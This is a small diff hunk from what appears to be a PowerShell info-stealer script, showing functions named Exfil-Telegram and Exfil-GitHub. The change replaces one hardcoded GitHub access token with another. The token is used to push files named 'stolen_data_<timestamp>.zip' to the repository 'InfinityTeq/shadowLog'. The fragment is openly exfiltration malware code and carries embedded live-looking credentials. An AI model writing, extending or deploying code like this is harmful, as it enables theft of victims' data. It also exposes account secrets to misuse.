@@ -243,7 +243,7 @@ function Exfil-Telegram {
 function Exfil-GitHub {
     param([string]$FilePath)
     try {
-        $token = "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"
+        $token = "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"
         $repo = "InfinityTeq/shadowLog"
         $branch = "main"
         $fileName = "stolen_data_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
